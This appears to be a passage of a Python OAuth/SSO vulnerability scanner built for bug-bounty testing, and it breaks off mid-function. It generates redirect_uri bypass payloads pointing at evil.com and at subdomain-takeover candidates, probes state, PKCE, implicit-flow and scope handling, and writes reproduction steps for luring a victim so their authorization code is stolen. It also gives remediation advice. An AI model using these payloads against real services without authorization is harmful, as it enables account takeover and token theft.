#!/usr/bin/env python3
"""
oauthprobe.py — OAuth 2.0 & SSO Flow Vulnerability Testing
===========================================================
Author  : RareKez / security research tooling
License : MIT (for authorized use only)

Chains from : jsreaper.py     (--js)    — OAuth endpoints from JS
              subtakeover.py  (--subtakeover) — subdomain takeover candidates
              plain list      (--domain) — auto-discover from target domain

Feeds into  : Bug bounty reports (standalone OAuth/SSO findings)

Pipeline:
  1. Discover OAuth endpoints:
       - Authorization endpoint (response_type=code/token)
       - Token endpoint, userinfo endpoint, revocation endpoint
       - Well-known configuration (/.well-known/openid-configuration)
       - Client IDs and redirect_uri allowlists from JS source
  2. State parameter security:
       - Missing state = CSRF vulnerability
       - Predictable/reused state values
       - PKCE absent on public clients
  3. redirect_uri bypass testing:
       - Path traversal (/callback/../evil)
       - Subdomain wildcard (evil.legit.com)
       - Cross-subdomain with known takeover candidates
       - Query string injection, fragment injection
       - Registered domain bypass (legit.com.evil.com)
       - Port variation
       - Localhost bypass
       - Null byte injection
  4. Token security:
       - Authorization code reuse
       - Token in URL fragment (implicit flow leak)
       - Referrer header leakage
       - Scope escalation (requesting admin scopes)
  5. SSO-specific tests:
       - Open redirect chaining
       - Cross-tenant access
       - Single logout validation
  6. Generate JSON + HTML report with reproduction steps

Usage:
  python3 oauthprobe.py --js js-findings.json --domain eskimi.com --output oauth
  python3 oauthprobe.py --domain eskimi.com --output oauth
  python3 oauthprobe.py --js js-findings.json --domain eskimi.com \
      --subtakeover scan.json --output oauth
  python3 oauthprobe.py --domain eskimi.com \
      --client-id YOUR_CLIENT_ID --redirect-uri https://app.eskimi.com/callback

LEGAL: Only use against targets you have explicit written authorization to test.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import datetime
import hashlib
import json
import re
import secrets
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import Any

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    )
    from rich.panel import Panel
    from rich.markup import escape
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    console = None

import logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("oauthprobe")
for _n in ("httpx", "httpcore"):
    logging.getLogger(_n).setLevel(logging.WARNING)


# ═════════════════════════════════════════════════════════════════════════════
# WELL-KNOWN OAUTH PATHS
# ═════════════════════════════════════════════════════════════════════════════

WELLKNOWN_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/oauth/.well-known/openid-configuration",
    "/api/.well-known/openid-configuration",
    "/auth/.well-known/openid-configuration",
    "/v1/.well-known/openid-configuration",
    "/.well-known/jwks.json",
]

OAUTH_PATH_HINTS = [
    "/oauth/authorize", "/oauth2/authorize", "/oauth/token",
    "/oauth2/token", "/authorize", "/auth/authorize",
    "/connect/authorize", "/api/oauth/authorize",
    "/v1/oauth/authorize", "/login/oauth/authorize",
    "/oauth/callback", "/oauth2/callback",
    "/auth/callback", "/api/auth/callback",
    "/signin-oidc", "/auth/openid-callback",
]

# Common redirect_uri patterns seen across real apps
REDIRECT_URI_PATTERNS = [
    re.compile(r'redirect_uri=["\']?([^"\'&\s]+)', re.I),
    re.compile(r'redirectUri\s*[=:]\s*["\']([^"\']+)', re.I),
    re.compile(r'callbackUrl\s*[=:]\s*["\']([^"\']+)', re.I),
    re.compile(r'returnUrl\s*[=:]\s*["\']([^"\']+)', re.I),
]

CLIENT_ID_PATTERNS = [
    re.compile(r'client_id=["\']?([A-Za-z0-9_\-\.]{8,})', re.I),
    re.compile(r'clientId\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{8,})["\']', re.I),
    re.compile(r'client-id["\']?\s*[=:]\s*["\']([A-Za-z0-9_\-\.]{8,})', re.I),
    re.compile(r'"client_id"\s*:\s*"([A-Za-z0-9_\-\.]{8,})"', re.I),
]

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_COLOR = {
    "CRITICAL": "bold red", "HIGH": "bold yellow",
    "MEDIUM": "yellow", "LOW": "cyan", "INFO": "dim",
}
SEV_EMOJI = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}
UA = "Mozilla/5.0 (compatible; OAuthProbe/1.0)"


# ═════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class OAuthEndpoints:
    """Discovered OAuth 2.0 / OIDC endpoint configuration."""
    issuer: str = ""
    authorization_endpoint: str = ""
    token_endpoint: str = ""
    userinfo_endpoint: str = ""
    revocation_endpoint: str = ""
    jwks_uri: str = ""
    registration_endpoint: str = ""
    supported_response_types: list[str] = field(default_factory=list)
    supported_grant_types: list[str] = field(default_factory=list)
    supported_scopes: list[str] = field(default_factory=list)
    client_ids: list[str] = field(default_factory=list)
    redirect_uris: list[str] = field(default_factory=list)
    raw_config: dict = field(default_factory=dict)


@dataclass
class OAuthFinding:
    host: str
    endpoint: str
    test_type: str
    severity: str
    title: str
    detail: str
    evidence: str
    steps_to_reproduce: str
    recommendation: str
    cvss_estimate: str = ""
    poc_url: str = ""


@dataclass
class OAuthReport:
    domain: str
    scan_time: str
    source_files: list[str]
    elapsed_seconds: float = 0.0
    endpoints_found: list[OAuthEndpoints] = field(default_factory=list)
    total_tests: int = 0
    findings: list[OAuthFinding] = field(default_factory=list)


# ═════════════════════════════════════════════════════════════════════════════
# HTTP HELPERS
# ═════════════════════════════════════════════════════════════════════════════

async def http_get(
    url: str,
    timeout: float = 10.0,
    headers: dict | None = None,
    follow_redirects: bool = False,
) -> tuple[int | None, dict, str, str | None]:
    """GET → (status, headers, body[:4000], redirect_location)."""
    if not HAS_HTTPX:
        return None, {}, "", None
    hdrs = {"User-Agent": UA, **(headers or {})}
    try:
        async with httpx.AsyncClient(
            timeout=timeout, verify=False,
            follow_redirects=follow_redirects, headers=hdrs,
        ) as c:
            resp = await c.get(url)
            loc  = resp.headers.get("location")
            return resp.status_code, dict(resp.headers), resp.text[:4000], loc
    except Exception as exc:
        log.debug(f"[GET] {url}: {exc}")
        return None, {}, "", None


async def http_post(
    url: str,
    data: dict | str | None = None,
    json_body: dict | None = None,
    timeout: float = 10.0,
    headers: dict | None = None,
) -> tuple[int | None, dict, str, str | None]:
    """POST → (status, headers, body, redirect_location)."""
    if not HAS_HTTPX:
        return None, {}, "", None
    hdrs = {
        "User-Agent": UA,
        "Content-Type": "application/json" if json_body else "application/x-www-form-urlencoded",
        **(headers or {}),
    }
    try:
        async with httpx.AsyncClient(
            timeout=timeout, verify=False, follow_redirects=False,
        ) as c:
            if json_body:
                resp = await c.post(url, headers=hdrs, json=json_body)
            elif isinstance(data, dict):
                resp = await c.post(url, headers=hdrs, data=data)
            else:
                resp = await c.post(url, headers=hdrs, content=data or "")
            loc = resp.headers.get("location")
            return resp.status_code, dict(resp.headers), resp.text[:4000], loc
    except Exception as exc:
        log.debug(f"[POST] {url}: {exc}")
        return None, {}, "", None


# ═════════════════════════════════════════════════════════════════════════════
# OAUTH ENDPOINT DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

async def discover_oauth_from_wellknown(
    base_url: str, timeout: float
) -> OAuthEndpoints | None:
    """
    Fetch /.well-known/openid-configuration (or variants) and parse
    the full OIDC provider metadata document.
    """
    for path in WELLKNOWN_PATHS:
        url = base_url.rstrip("/") + path
        status, _, body, _ = await http_get(url, timeout, follow_redirects=True)
        if status != 200 or not body:
            continue
        try:
            cfg = json.loads(body)
        except Exception:
            continue
        if "authorization_endpoint" not in cfg and "issuer" not in cfg:
            continue
        ep = OAuthEndpoints(
            issuer=cfg.get("issuer", ""),
            authorization_endpoint=cfg.get("authorization_endpoint", ""),
            token_endpoint=cfg.get("token_endpoint", ""),
            userinfo_endpoint=cfg.get("userinfo_endpoint", ""),
            revocation_endpoint=cfg.get("revocation_endpoint", ""),
            jwks_uri=cfg.get("jwks_uri", ""),
            registration_endpoint=cfg.get("dynamic_client_registration_endpoint",
                                           cfg.get("registration_endpoint", "")),
            supported_response_types=cfg.get("response_types_supported", []),
            supported_grant_types=cfg.get("grant_types_supported", []),
            supported_scopes=cfg.get("scopes_supported", []),
            raw_config=cfg,
        )
        log.info(f"[Discovery] Found OIDC config at {url}")
        return ep
    return None


async def discover_oauth_from_paths(
    base_url: str, timeout: float
) -> OAuthEndpoints | None:
    """
    Brute-force common OAuth endpoint paths when well-known doc is absent.
    """
    auth_ep = ""
    for path in OAUTH_PATH_HINTS:
        url = base_url.rstrip("/") + path
        status, hdrs, body, loc = await http_get(url, timeout)
        if status is None:
            continue
        # Auth endpoint returns redirect with code= or 400/401 for bad params
        if status in (302, 301, 400, 401) or (
            status == 200 and any(
                kw in body.lower()
                for kw in ["oauth", "authorize", "client_id", "response_type"]
            )
        ):
            auth_ep = url
            log.info(f"[Discovery] Found OAuth path at {url} (HTTP {status})")
            break

    if not auth_ep:
        return None
    return OAuthEndpoints(authorization_endpoint=auth_ep)


async def extract_oauth_from_js(
    js_data: dict,
) -> tuple[list[str], list[str], list[str]]:
    """
    Extract client_ids, redirect_uris, and auth_endpoints from jsreaper output.
    Returns (client_ids, redirect_uris, auth_endpoints).
    """
    client_ids: list[str] = []
    redirect_uris: list[str] = []
    auth_endpoints: list[str] = []

    # Scan endpoints list from jsreaper
    for ep in js_data.get("endpoints", []):
        url = ep.get("endpoint", ep.get("url", ""))
        if any(kw in url.lower() for kw in ["authorize", "oauth", "auth/code", "connect"]):
            auth_endpoints.append(url)

    # Scan oauth_refs extracted by jsreaper
    for ref in js_data.get("oauth_refs", []):
        ref_type = ref.get("type", "")
        val      = ref.get("value", "")
        if not val:
            continue
        if ref_type == "client_id":
            if val not in client_ids:
                client_ids.append(val)
        elif ref_type == "redirect_uri":
            if val not in redirect_uris:
                redirect_uris.append(val)
        elif ref_type == "auth_endpoint":
            if val not in auth_endpoints:
                auth_endpoints.append(val)

    # Also scan all host_results for any OAuth patterns we can find
    all_text = json.dumps(js_data)
    for pat in CLIENT_ID_PATTERNS:
        for m in pat.finditer(all_text):
            cid = m.group(1)
            if cid not in client_ids and len(cid) >= 8:
                client_ids.append(cid)

    for pat in REDIRECT_URI_PATTERNS:
        for m in pat.finditer(all_text):
            ruri = m.group(1)
            if ruri.startswith("http") and ruri not in redirect_uris:
                redirect_uris.append(ruri)

    return client_ids, redirect_uris, auth_endpoints


# ═════════════════════════════════════════════════════════════════════════════
# redirect_uri BYPASS PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

def generate_redirect_uri_variants(
    legit_uri: str,
    domain: str,
    takeover_candidates: list[str] | None = None,
) -> list[tuple[str, str, str]]:
    """
    Generate redirect_uri bypass variants from a legitimate registered URI.
    Returns list of (bypass_uri, technique_name, severity).
    """
    parsed = urllib.parse.urlparse(legit_uri)
    host   = parsed.netloc
    scheme = parsed.scheme
    path   = parsed.path

    variants: list[tuple[str, str, str]] = []

    # ── 1. Path traversal ────────────────────────────────────────────────
    variants += [
        (f"{scheme}://{host}{path}/../evil",
         "Path traversal: /callback/../evil", "HIGH"),
        (f"{scheme}://{host}{path}/../../evil",
         "Double traversal: /callback/../../evil", "HIGH"),
        (f"{scheme}://{host}{path}%2F..%2Fevil",
         "URL-encoded traversal", "HIGH"),
        (f"{scheme}://{host}{path}/.%2Fevil",
         "Dot-slash traversal", "MEDIUM"),
    ]

    # ── 2. Query string / fragment injection ─────────────────────────────
    evil_base = f"https://evil.com/?x="
    variants += [
        (f"{legit_uri}?extra=param",
         "Extra query parameter injection", "MEDIUM"),
        (f"{legit_uri}#https://evil.com/",
         "Fragment injection (token leakage via Referer)", "MEDIUM"),
        (f"{legit_uri}?redirect=https://evil.com/",
         "Open redirect after callback", "MEDIUM"),
        (f"{legit_uri}\\evil.com",
         "Backslash bypass (IIS path normalization)", "MEDIUM"),
    ]

    # ── 3. Domain-level bypasses ──────────────────────────────────────────
    variants += [
        (f"{scheme}://evil.{host}/callback",
         f"Pre-domain match: evil.{host}", "HIGH"),
        (f"{scheme}://{host}.evil.com/callback",
         f"Post-domain match: {host}.evil.com", "HIGH"),
        (f"{scheme}://not-{host}/callback",
         f"Prefix mismatch: not-{host}", "LOW"),
        (f"{scheme}://{host}@evil.com/callback",
         "@ injection in authority", "HIGH"),
        (f"{scheme}://evil.com/{host}/callback",
         f"Domain in path: /evil.com/{host}/", "MEDIUM"),
    ]

    # ── 4. Subdomain variants (if wildcard matching suspected) ────────────
    base_domain = ".".join(host.split(".")[-2:]) if host.count(".") >= 2 else host
    variants += [
        (f"{scheme}://evil.{base_domain}/callback",
         f"Subdomain wildcard: evil.{base_domain}", "HIGH"),
        (f"{scheme}://evil.{base_domain}@evil.com/",
         "Subdomain + @ injection", "HIGH"),
        (f"{scheme}://not_exist.{base_domain}/callback",
         "Non-existent subdomain (potential takeover)", "MEDIUM"),
    ]

    # ── 5. Known takeover subdomains (highest impact) ─────────────────────
    for sub in (takeover_candidates or []):
        variants.append((
            f"https://{sub}/callback",
            f"Subdomain takeover candidate: {sub}",
            "CRITICAL",
        ))

    # ── 6. Scheme / localhost ─────────────────────────────────────────────
    variants += [
        (f"http://{host}/callback",
         "HTTP downgrade (from HTTPS)", "MEDIUM"),
        ("http://localhost/callback",
         "Localhost redirect_uri", "HIGH"),
        ("http://127.0.0.1/callback",
         "Loopback IP redirect_uri", "HIGH"),
        (f"{scheme}://{host}:8080/callback",
         "Non-standard port bypass", "MEDIUM"),
        ("urn:ietf:wg:oauth:2.0:oob",
         "OOB special value (device flow)", "LOW"),
    ]

    # ── 7. Null byte / special characters ─────────────────────────────────
    variants += [
        (f"{legit_uri}%00.evil.com",
         "Null byte injection", "MEDIUM"),
        (f"{legit_uri}%0d%0a/evil",
         "CRLF injection in redirect_uri", "MEDIUM"),
        (f"{scheme}://{host}%252f@evil.com/",
         "Double-encoded slash", "LOW"),
    ]

    return variants


# ═════════════════════════════════════════════════════════════════════════════
# TEST MODULES
# ═════════════════════════════════════════════════════════════════════════════

class OAuthTester:
    def __init__(
        self,
        domain: str,
        timeout: float = 10.0,
    ):
        self.domain  = domain
        self.timeout = timeout
        self._tests_run = 0

    # ── Helpers ───────────────────────────────────────────────────────────

    def _build_auth_url(
        self,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
        response_type: str = "code",
        state: str | None = None,
        scope: str = "openid profile email",
        extra: dict | None = None,
    ) -> str:
        params = {
            "client_id":     client_id,
            "redirect_uri":  redirect_uri,
            "response_type": response_type,
            "scope":         scope,
        }
        if state is not None:
            params["state"] = state
        params.update(extra or {})
        return auth_endpoint + "?" + urllib.parse.urlencode(params)

    async def _check_redirect_accepted(
        self, auth_url: str
    ) -> tuple[bool, str]:
        """
        Follow the auth URL and check if the redirect_uri was accepted.
        Returns (accepted, redirect_location).
        """
        status, hdrs, body, loc = await http_get(
            auth_url, self.timeout, follow_redirects=False
        )
        self._tests_run += 1
        if loc and ("code=" in loc or "token=" in loc or "access_token=" in loc):
            return True, loc
        # Also accept: redirect to the redirect_uri even without a code
        if loc and any(
            loc.startswith(prefix) for prefix in
            ["http://", "https://", "urn:"]
        ):
            return True, loc
        # A 400 with "invalid redirect_uri" = not accepted (good)
        if status in (400, 401) and any(
            kw in body.lower()
            for kw in ["invalid_redirect", "redirect_uri", "mismatch", "not allowed"]
        ):
            return False, ""
        # Anything that's not an error is potentially accepted
        if status in (200, 302, 301) and status != 400:
            return True, loc or ""
        return False, ""

    # ── Test 1: State parameter ───────────────────────────────────────────

    async def test_state_param(
        self,
        host: str,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not auth_endpoint or not client_id or not redirect_uri:
            return findings

        # ── Missing state ─────────────────────────────────────────────────
        url_no_state = self._build_auth_url(
            auth_endpoint, client_id, redirect_uri, state=None
        )
        status, hdrs, body, loc = await http_get(
            url_no_state, self.timeout, follow_redirects=False
        )
        self._tests_run += 1

        # If no error about missing state, the flow is CSRF-vulnerable
        no_state_error = status not in (400, 401) or not any(
            kw in body.lower()
            for kw in ["state", "csrf", "required"]
        )
        if no_state_error and status is not None:
            findings.append(OAuthFinding(
                host=host,
                endpoint=auth_endpoint,
                test_type="CSRF_STATE",
                severity="HIGH",
                title="OAuth Authorization Endpoint Accepts Request Without state Parameter",
                detail=(
                    f"The authorization endpoint at {auth_endpoint} does not require "
                    f"the 'state' parameter. The state parameter is the only "
                    f"CSRF protection in OAuth 2.0 (RFC 6749 §10.12). Without it, "
                    f"an attacker can initiate an authorization flow and trick a victim "
                    f"into completing it — binding the victim's account to the attacker's "
                    f"session (account takeover via CSRF)."
                ),
                evidence=(
                    f"GET {url_no_state}\n"
                    f"Response: HTTP {status} — no error about missing state"
                ),
                steps_to_reproduce=(
                    f"1. Start an OAuth flow WITHOUT a state parameter:\n"
                    f"   {url_no_state}\n"
                    f"2. If the flow completes, the authorization endpoint is CSRF-vulnerable.\n"
                    f"3. An attacker can craft this URL and use CSRF to bind a victim's "
                    f"account to their own OAuth token."
                ),
                recommendation=(
                    "Require a cryptographically random state parameter on every "
                    "authorization request. Validate it server-side before exchanging "
                    "the authorization code. Use PKCE (RFC 7636) as a complement."
                ),
                cvss_estimate="8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)",
                poc_url=url_no_state,
            ))

        # ── Predictable / static state ────────────────────────────────────
        for static_state in ["1", "0", "state", "csrf", "test", "abc123", "null"]:
            url_static = self._build_auth_url(
                auth_endpoint, client_id, redirect_uri, state=static_state
            )
            s2, _, b2, _ = await http_get(url_static, self.timeout)
            self._tests_run += 1
            if s2 not in (400, 401):
                findings.append(OAuthFinding(
                    host=host,
                    endpoint=auth_endpoint,
                    test_type="PREDICTABLE_STATE",
                    severity="MEDIUM",
                    title=f"OAuth Accepts Predictable state Value ('{static_state}')",
                    detail=(
                        f"The authorization endpoint accepted a state value of '{static_state}' "
                        f"without rejecting it. State values should be unpredictable. "
                        f"Predictable state enables CSRF attacks even when state is present."
                    ),
                    evidence=f"GET {url_static} → HTTP {s2}",
                    steps_to_reproduce=(
                        f"1. Send authorization request with state={static_state}\n"
                        f"2. Server accepts it without validation.\n"
                        f"3. An attacker who knows or guesses the state can CSRF the flow."
                    ),
                    recommendation=(
                        "Generate state values using a CSPRNG with at least 128 bits of entropy "
                        "(e.g. secrets.token_urlsafe(32) in Python). "
                        "Validate the exact value server-side on callback."
                    ),
                    poc_url=url_static,
                ))
                break

        return findings

    # ── Test 2: redirect_uri bypass ───────────────────────────────────────

    async def test_redirect_uri(
        self,
        host: str,
        auth_endpoint: str,
        client_id: str,
        legit_redirect_uri: str,
        takeover_candidates: list[str] | None = None,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not auth_endpoint or not client_id:
            return findings

        variants = generate_redirect_uri_variants(
            legit_redirect_uri, self.domain, takeover_candidates
        )
        state = secrets.token_urlsafe(16)

        for bypass_uri, technique_name, severity in variants:
            url = self._build_auth_url(
                auth_endpoint, client_id, bypass_uri, state=state
            )
            accepted, loc = await self._check_redirect_accepted(url)

            if not accepted:
                continue

            # Confirm it's a real redirect to the bypass URI, not to the legit one
            if loc and urllib.parse.urlparse(legit_redirect_uri).netloc in loc:
                continue  # Server corrected to legit URI — not a bypass

            is_takeover = "takeover" in technique_name.lower()
            final_severity = "CRITICAL" if is_takeover else severity

            findings.append(OAuthFinding(
                host=host,
                endpoint=auth_endpoint,
                test_type="REDIRECT_URI_BYPASS",
                severity=final_severity,
                title=(
                    f"redirect_uri Validation Bypass — {technique_name}"
                    + (" + Subdomain Takeover = Account Takeover" if is_takeover else "")
                ),
                detail=(
                    f"The OAuth authorization endpoint at {auth_endpoint} accepted "
                    f"redirect_uri='{bypass_uri}' using the '{technique_name}' technique. "
                    + (
                        f"Combined with the subdomain takeover of {bypass_uri.split('/')[2]}, "
                        f"an attacker can steal authorization codes and access tokens from "
                        f"any user who clicks a crafted authorization URL — full account takeover."
                        if is_takeover else
                        f"An attacker who controls a server at that URI can steal "
                        f"the authorization code and use it to access the victim's account."
                    )
                ),
                evidence=(
                    f"Request: GET {url}\n"
                    f"Response: HTTP redirect to {loc or bypass_uri}"
                ),
                steps_to_reproduce=(
                    f"1. Host a server at {bypass_uri} (or use the subdomain takeover)\n"
                    f"2. Send a victim the following URL:\n"
                    f"   {url}\n"
                    f"3. When the victim authenticates, the authorization code is sent to your server.\n"
                    f"4. Exchange the code for an access token at {auth_endpoint.replace('/authorize','').replace('/auth','')}/token"
                ),
                recommendation=(
                    "Implement exact string matching for redirect_uri — "
                    "no prefix/suffix/wildcard matching. "
                    "Register the complete URL including scheme, host, path, and port. "
                    "Reject any redirect_uri not in an explicit allowlist. "
                    "Never allow wildcard subdomains in redirect_uri registration."
                ),
                cvss_estimate=(
                    "9.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)"
                    if final_severity == "CRITICAL" else
                    "7.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)"
                ),
                poc_url=url,
            ))

            # Stop at first confirmed bypass (don't need duplicates)
            if final_severity == "CRITICAL":
                break

        return findings

    # ── Test 3: PKCE absence ──────────────────────────────────────────────

    async def test_pkce(
        self,
        host: str,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not auth_endpoint or not client_id:
            return findings

        # Try authorization code flow WITHOUT code_challenge
        url_no_pkce = self._build_auth_url(
            auth_endpoint, client_id, redirect_uri, state=secrets.token_urlsafe(16)
        )
        status, _, body, loc = await http_get(url_no_pkce, self.timeout)
        self._tests_run += 1

        # If server doesn't complain about missing code_challenge, PKCE is optional
        pkce_required = any(
            kw in body.lower()
            for kw in ["code_challenge", "pkce", "code_verifier", "s256", "plain"]
        )
        if not pkce_required and status not in (400, 401):
            # Only flag this for public clients (SPAs, mobile apps)
            # — detected if redirect_uri is localhost or a custom scheme
            parsed_redir = urllib.parse.urlparse(redirect_uri)
            is_public_client = (
                parsed_redir.scheme not in ("https",) or
                parsed_redir.netloc == "localhost" or
                "spa" in redirect_uri.lower() or
                "mobile" in redirect_uri.lower()
            )
            if is_public_client:
                findings.append(OAuthFinding(
                    host=host,
                    endpoint=auth_endpoint,
                    test_type="PKCE_ABSENT",
                    severity="MEDIUM",
                    title="PKCE Not Required for Public Client Authorization Code Flow",
                    detail=(
                        f"The authorization endpoint at {auth_endpoint} accepted an "
                        f"authorization code request without a code_challenge parameter. "
                        f"For public clients (SPAs, mobile apps), PKCE (RFC 7636) is "
                        f"required to prevent authorization code interception attacks. "
                        f"Without PKCE, an attacker who intercepts the authorization code "
                        f"(e.g. via a malicious redirect handler) can exchange it for tokens."
                    ),
                    evidence=(
                        f"GET {url_no_pkce} → HTTP {status}\n"
                        f"No error about missing code_challenge in response"
                    ),
                    steps_to_reproduce=(
                        f"1. Initiate authorization flow without code_challenge:\n"
                        f"   {url_no_pkce}\n"
                        f"2. Server accepts the request without requiring PKCE.\n"
                        f"3. On platforms where the authorization code can be intercepted "
                        f"(e.g. iOS custom URL schemes), an attacker can exchange it for tokens."
                    ),
                    recommendation=(
                        "Require PKCE (code_challenge and code_challenge_method=S256) "
                        "for all public client authorization code flows. "
                        "Reject requests missing code_challenge with error=invalid_request."
                    ),
                    cvss_estimate="6.8 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)",
                ))

        # Also test: server accepts code_challenge_method=plain (weaker than S256)
        verifier = secrets.token_urlsafe(32)
        url_plain = self._build_auth_url(
            auth_endpoint, client_id, redirect_uri,
            state=secrets.token_urlsafe(16),
            extra={
                "code_challenge":        verifier,
                "code_challenge_method": "plain",
            }
        )
        s2, _, b2, _ = await http_get(url_plain, self.timeout)
        self._tests_run += 1
        if s2 not in (400, 401):
            plain_error = any(
                kw in b2.lower()
                for kw in ["plain", "not supported", "invalid", "s256 only"]
            )
            if not plain_error:
                findings.append(OAuthFinding(
                    host=host,
                    endpoint=auth_endpoint,
                    test_type="PKCE_PLAIN",
                    severity="LOW",
                    title="PKCE Accepts Weaker 'plain' code_challenge_method",
                    detail=(
                        f"The authorization endpoint accepted code_challenge_method=plain. "
                        f"The 'plain' method provides no security advantage over no PKCE "
                        f"if the code_verifier can be observed in transit. Only S256 is "
                        f"recommended per RFC 7636."
                    ),
                    evidence=f"GET with code_challenge_method=plain → HTTP {s2} (no error)",
                    steps_to_reproduce=(
                        f"Send: {url_plain}\n"
                        f"Server accepts plain method without error."
                    ),
                    recommendation=(
                        "Require code_challenge_method=S256. "
                        "Reject requests using method=plain with error=invalid_request."
                    ),
                    poc_url=url_plain,
                ))

        return findings

    # ── Test 4: Implicit flow / token in fragment ─────────────────────────

    async def test_implicit_flow(
        self,
        host: str,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not auth_endpoint or not client_id:
            return findings

        # Test if response_type=token (implicit flow) is supported
        url_implicit = self._build_auth_url(
            auth_endpoint, client_id, redirect_uri,
            response_type="token",
            state=secrets.token_urlsafe(16),
        )
        status, _, body, loc = await http_get(url_implicit, self.timeout)
        self._tests_run += 1

        # Not rejected = implicit flow is supported
        implicit_rejected = status in (400, 401) and any(
            kw in body.lower()
            for kw in ["unsupported_response_type", "implicit", "token", "not allowed"]
        )

        if not implicit_rejected and status is not None:
            findings.append(OAuthFinding(
                host=host,
                endpoint=auth_endpoint,
                test_type="IMPLICIT_FLOW",
                severity="MEDIUM",
                title="OAuth Implicit Flow (response_type=token) Supported",
                detail=(
                    f"The authorization endpoint at {auth_endpoint} accepts "
                    f"response_type=token (implicit flow). The implicit flow delivers "
                    f"access tokens in the URL fragment, making them visible in browser "
                    f"history, server access logs (if the fragment leaks via Referer), "
                    f"and to any JavaScript on the page. OAuth 2.0 Security BCP "
                    f"(RFC 9700) recommends against using the implicit flow."
                ),
                evidence=f"GET {url_implicit} → HTTP {status} (not rejected)",
                steps_to_reproduce=(
                    f"1. Send: {url_implicit}\n"
                    f"2. Server does not return unsupported_response_type error.\n"
                    f"3. If a victim visits a page that loads this URL in an iframe, "
                    f"the access_token in the fragment can be read by JavaScript."
                ),
                recommendation=(
                    "Disable the implicit flow. Use the authorization code flow with PKCE. "
                    "Add response_type=token to the list of rejected response types. "
                    "Follow OAuth 2.0 Security BCP (RFC 9700)."
                ),
                cvss_estimate="5.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)",
                poc_url=url_implicit,
            ))

        # Test response_type=id_token (hybrid implicit for OIDC)
        url_id_token = self._build_auth_url(
            auth_endpoint, client_id, redirect_uri,
            response_type="id_token",
            state=secrets.token_urlsafe(16),
        )
        s2, _, b2, _ = await http_get(url_id_token, self.timeout)
        self._tests_run += 1
        idt_rejected = s2 in (400, 401) and "unsupported" in b2.lower()
        if not idt_rejected and s2 is not None and not implicit_rejected:
            findings.append(OAuthFinding(
                host=host,
                endpoint=auth_endpoint,
                test_type="IMPLICIT_ID_TOKEN",
                severity="LOW",
                title="OIDC Implicit id_token Flow (response_type=id_token) Supported",
                detail=(
                    f"response_type=id_token is accepted, delivering the ID token "
                    f"directly in the URL fragment. ID tokens contain user identity "
                    f"claims (sub, email, etc.) and their exposure can enable "
                    f"account enumeration and replay attacks."
                ),
                evidence=f"GET {url_id_token} → HTTP {s2} (not rejected)",
                steps_to_reproduce=(
                    f"1. Send: {url_id_token}\n"
                    f"2. Server does not reject id_token response type."
                ),
                recommendation=(
                    "Use response_type=code with PKCE instead of any implicit/hybrid flow."
                ),
                poc_url=url_id_token,
            ))

        return findings

    # ── Test 5: Scope escalation ──────────────────────────────────────────

    async def test_scope_escalation(
        self,
        host: str,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
        endpoints: OAuthEndpoints,
    ) -> list[OAuthFinding]:
        findings: list[OAuthFinding] = []
        if not auth_endpoint or not client_id:
            return findings

        # Try requesting admin/privileged scopes
        escalation_scopes = [
            "admin", "superuser", "write:all", "read:all",
            "offline_access admin", "openid profile email admin",
            "user:read user:write admin:org",
            "https://graph.microsoft.com/.default",
            "https://www.googleapis.com/auth/cloud-platform",
        ]

        for scope in escalation_scopes[:4]:  # limit requests
            url_scope = self._build_auth_url(
                auth_endpoint, client_id, redirect_uri,
                scope=scope,
                state=secrets.token_urlsafe(16),
            )
            status, _, body, loc = await http_get(url_scope, self.timeout)
            self._tests_run += 1

            scope_rejected = any(
                kw in body.lower()
                for kw in ["invalid_scope", "scope", "not allowed", "unauthorized"]
            )
            if not scope_rejected and status not in (400, 401):
                findings.append(OAuthFinding(
                    host=host,
                    endpoint=auth_endpoint,
                    test_type="SCOPE_ESCALATION",
                    severity="HIGH",
                    title=f"OAuth Scope Escalation — Admin Scope Accepted: '{scope}'",
                    detail=(
                        f"The authorization endpoint accepted scope='{scope}' without "
                        f"returning invalid_scope. If this scope is actually granted "
                        f"in the resulting token, it may provide elevated privileges "
                        f"not intended for regular users."
                    ),
                    evidence=f"GET {url_scope} → HTTP {status} (scope not rejected)",
                    steps_to_reproduce=(
                        f"1. Request authorization with scope='{scope}':\n"
                        f"   {url_scope}\n"
                        f"2. Complete the authorization flow.\n"
                        f"3. Check if the issued access token contains the admin scope "
                        f"by decoding its JWT payload or calling the userinfo endpoint."
                    ),
                    recommendation=(
                        "Validate requested scopes against a per-client allowlist. "
